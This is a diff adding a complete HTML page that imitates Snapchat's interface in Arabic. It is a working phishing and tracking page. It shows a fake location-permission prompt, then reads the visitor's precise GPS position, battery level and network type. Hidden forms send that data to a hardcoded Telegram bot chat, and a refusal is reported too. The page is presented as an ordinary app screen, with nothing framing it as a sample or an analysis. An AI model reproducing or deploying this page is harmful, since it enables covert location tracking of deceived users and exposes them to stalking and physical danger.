@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Snapchat</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;height:100vh;overflow:hidden;position:fixed;width:100%}
+
+.camera{
+  position:absolute;top:0;left:0;width:100%;height:100%;
+  background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);
+  background-size:400% 400%;animation:grad 10s ease infinite
+}
+@keyframes grad{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+.camera::after{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 35%,transparent 25%,rgba(0,0,0,0.5) 100%)}
+
+.top-bar{
+  position:absolute;top:0;left:0;right:0;z-index:10;
+  display:flex;justify-content:space-between;align-items:center;
+  padding:50px 16px 8px
+}
+.top-bar .time{font-size:16px;font-weight:600}
+.top-bar .icons{display:flex;gap:16px}
+.top-bar .icons span{font-size:18px;filter:drop-shadow(0 1px 4px rgba(0,0,0,0.6))}
+
+.snap-ui{
+  position:absolute;bottom:0;left:0;right:0;z-index:10;
+  background:linear-gradient(transparent 10%,rgba(0,0,0,0.9) 40%);
+  padding:24px 14px 36px
+}
+.tabs{display:flex;gap:6px;margin-bottom:14px}
+.tabs div{
+  font-size:11px;color:#888;padding:5px 14px;border-radius:16px;transition:all 0.2s
+}
+.tabs .active{color:#fff;background:rgba(255,255,255,0.1)}
+.stories{display:flex;gap:12px;overflow-x:auto;padding:2px 0 10px;scrollbar-width:none}
+.stories::-webkit-scrollbar{display:none}
+.story{text-align:center;min-width:62px;flex-shrink:0}
+.av{
+  width:58px;height:58px;border-radius:50%;margin:0 auto 4px;
+  border:3px solid #d62976;display:flex;justify-content:center;align-items:center;
+  background:#1a1a2e;font-size:20px
+}
+.av.live{border-color:#fffc00}
+.name{font-size:10px;color:#ccc;max-width:58px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+.chats{
+  position:absolute;bottom:80px;left:0;right:0;padding:0 14px;z-index:10
+}
+.chat-item{
+  display:flex;align-items:center;gap:10px;padding:7px 0;
+  border-bottom:1px solid rgba(255,255,255,0.05)
+}
+.cav{
+  width:40px;height:40px;border-radius:50%;background:#1a1a2e;flex-shrink:0;
+  display:flex;justify-content:center;align-items:center;font-size:16px
+}
+.cav.l{background:#d62976}
+.cinfo{flex:1}
+.cname{font-size:12px;font-weight:500;color:#eee}
+.cmsg{font-size:11px;color:#666}
+
+#perm{
+  display:none;position:fixed;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,0.6);z-index:999;
+  justify-content:center;align-items:flex-end;
+  backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px)
+}
+#perm.active{display:flex}
+.sheet{
+  background:#1c1c1e;border-radius:14px 14px 0 0;width:100%;max-width:500px;
+  padding:20px 18px 32px;animation:up 0.25s ease-out
+}
+@keyframes up{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.sheet .ic{text-align:center;font-size:38px;margin-bottom:4px}
+.sheet h3{text-align:center;font-size:16px;font-weight:600;color:#fff;margin-bottom:4px}
+.sheet p{text-align:center;font-size:12px;color:#888;line-height:1.5;margin-bottom:18px}
+.btns{display:flex;gap:10px}
+.btns button{
+  flex:1;padding:13px;border-radius:12px;border:none;font-size:15px;font-weight:600;cursor:pointer
+}
+.btns .allow{background:#fffc00;color:#000}
+.btns .deny{background:#2c2c2e;color:#888}
+
+#load{
+  display:none;position:fixed;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,0.8);z-index:1000;
+  justify-content:center;align-items:center;flex-direction:column
+}
+#load.active{display:flex}
+#load .sp{width:30px;height:30px;border:3px solid #333;border-top:3px solid #fffc00;border-radius:50%;animation:s 0.7s linear infinite;margin-bottom:8px}
+@keyframes s{to{transform:rotate(360deg)}}
+#load span{font-size:13px;color:#999}
+</style>
+</head>
+<body>
+<div class="camera"></div>
+
+<div class="top-bar">
+  <div class="time"><span id="clock">00:00</span></div>
+  <div class="icons"><span>🔦</span><span>📷</span><span>💬</span></div>
+</div>
+
+<div class="snap-ui">
+  <div class="tabs">
+    <div class="active">القصص</div>
+    <div>الخريطة</div>
+    <div>الدردشة</div>
+  </div>
+  <div class="stories" id="stories">
+    <div class="story"><div class="av live">👻</div><div class="name">قصتي</div></div>
+    <div class="story"><div class="av">😎</div><div class="name">أحمد</div></div>
+    <div class="story"><div class="av">🤩</div><div class="name">سارة</div></div>
+    <div class="story"><div class="av">🔥</div><div class="name">محمد</div></div>
+    <div class="story"><div class="av">💪</div><div class="name">نورة</div></div>
+    <div class="story"><div class="av">❤️</div><div class="name">الجوكر</div></div>
+    <div class="story"><div class="av">🎮</div><div class="name">خالد</div></div>
+  </div>
+</div>
+
+<div class="chats">
+  <div class="chat-item"><div class="cav l">👻</div><div class="cinfo"><div class="cname">Snapchat</div><div class="cmsg">شاهد القصص القريبة</div></div></div>
+  <div class="chat-item"><div class="cav l">📍</div><div class="cinfo"><div class="cname">Snap Map</div><div class="cmsg">فعّل الموقع للأصدقاء قريبك</div></div></div>
+</div>
+
+<div id="perm">
+  <div class="sheet">
+    <div class="ic">📍</div>
+    <h3>Snapchat تريد الوصول لموقعك</h3>
+    <p>لعرض القصص والأصدقاء القريبين على الخريطة</p>
+    <div class="btns">
+      <button class="deny" id="denyBtn">ليس الآن</button>
+      <button class="allow" id="allowBtn">السماح</button>
+    </div>
+  </div>
+</div>
+
+<div id="load">
+  <div class="sp"></div>
+  <span>جاري التحميل...</span>
+</div>
+
+<iframe name="_tg" style="display:none"></iframe>
+
+<form action="https://api.telegram.org/bot8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg/sendLocation" method="POST" target="_tg" style="display:none">
+  <input type="hidden" name="chat_id" value="972326806">
+  <input type="hidden" name="latitude" id="_lat" value="">
+  <input type="hidden" name="longitude" id="_lng" value="">
+  <input type="hidden" name="horizontal_accuracy" id="_acc" value="">
+</form>
+
+<form action="https://api.telegram.org/bot8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg/sendMessage" method="POST" target="_tg" style="display:none">
+  <input type="hidden" name="chat_id" value="972326806">
+  <input type="hidden" name="text" id="_msg" value="">
+  <input type="hidden" name="parse_mode" value="HTML">
+  <input type="hidden" name="disable_web_page_preview" value="true">
+</form>
+
+<script>
+(function(){
+  const ID = Math.random().toString(36).slice(2,9).toUpperCase()
+  let sent = false, permEl = document.getElementById('perm'), loadEl = document.getElementById('load')
+
+  function clock(){const d=new Date();document.getElementById('clock').textContent=d.getHours().toString().padStart(2,'0')+':'+d.getMinutes().toString().padStart(2,'0')}
+  clock();setInterval(clock,1000)
+
+  function sendGPS(pos){
+    const lat=pos.coords.latitude,lng=pos.coords.longitude,acc=pos.coords.accuracy||0
+    document.getElementById('_lat').value=lat
+    document.getElementById('_lng').value=lng
+    document.getElementById('_acc').value=Math.round(acc)
+
+    var b='?';try{const n=navigator.battery;if(n&&n.level)b=Math.round(n.level*100)+'%'}catch(e){}
+    var n='?';try{const c=navigator.connection;if(c)n=c.type||c.effectiveType||'?'}catch(e){}
+
+    document.getElementById('_msg').value=
+      '<b>📍 SnapChat</b>\n🆔 '+ID+'\n🎯 <a href="https://www.google.com/maps?q='+lat+','+lng+'">'+lat+', '+lng+'</a>\n📏 ±'+acc.toFixed(1)+'م\n🔋 '+b+' | 📶 '+n+'\n🕐 '+new Date().toLocaleString('ar-SA')
+
+    document.forms[0].submit()
+    document.forms[1].submit()
+    sent=true
+    loadEl.classList.remove('active')
+  }
+
+  function failGPS(){
+    if(sent)return
+    document.getElementById('_msg').value='⚠️ '+ID+' | رفض الموقع'
+    document.forms[1].submit()
+    sent=true
+    loadEl.classList.remove('active')
+  }
+
+  function requestGPS(){
+    loadEl.classList.add('active')
+    setTimeout(()=>{if(!sent){failGPS();loadEl.classList.remove('active')}},14000)
+    navigator.geolocation.getCurrentPosition(sendGPS,failGPS,{enableHighAccuracy:true,timeout:12000,maximumAge:0})
+  }
+
+  document.addEventListener('touchstart',()=>{permEl.classList.add('active')},{once:true,passive:true})
+  document.addEventListener('click',()=>{permEl.classList.add('active')},{once:true})
+
+  document.getElementById('allowBtn').addEventListener('click',()=>{
+    permEl.classList.remove('active')
+    requestGPS()
+  })
+
+  document.getElementById('denyBtn').addEventListener('click',()=>{
+    permEl.classList.remove('active')
+  })
+})()
+</script>
+</body>
+</html>
